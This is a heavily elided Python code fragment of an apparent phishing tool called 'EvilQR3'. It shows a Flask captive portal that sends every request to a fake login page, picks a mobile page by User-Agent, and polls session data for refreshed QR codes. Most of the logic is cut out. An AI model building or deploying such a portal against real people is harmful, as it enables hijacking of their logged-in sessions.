...
def login():
    ...
    if (
        ...
        if FORCE_REDIRECT:
            ...
            if (
                not parsed_url.netloc and not parsed_url.scheme
    ...
    if session_data.get("session_info"):
        if updateTime > 0:
            if updateTime >= session_data["session_info"].get("update_time"):
                ...
                if session_data.get("session_info"):
                    while (
                        not session_data["session_info"].get("update_qrcode")
                        or max_timeout >= 0
                    ):
                        max_timeout -= 5
                        time.sleep(5)
...
def catch_all(path):
    ...
    if PORT != 80:
        if matchRequestUserAgent(match_useragent, request.headers.get("User-Agent")):
            return redirect("http://{}:{}/mobile/login".format(SERVER, PORT))
        return redirect("http://{}:{}/login?".format(SERVER, PORT))
    if matchRequestUserAgent(match_useragent, request.headers.get("User-Agent")):
        return redirect("http://{}/mobile/login".format(SERVER, PORT))
    return redirect("http://{}/login?".format(SERVER))
...
def main():
    ...
    parser = argparse.ArgumentParser(description="EvilQR3 - ")
    parser.add_argument(
        "-t",
        "--tamplate",
        required=True,
        dest="template",
        help="path the theme login captive portal",
    )
    parser.add_argument(
        "-s",
        "--static",
        required=True,
        dest="static",
        help="path  of the static files from webpage",
    )
    ...
    app.static_url_path = r"\{}".format(args.static)
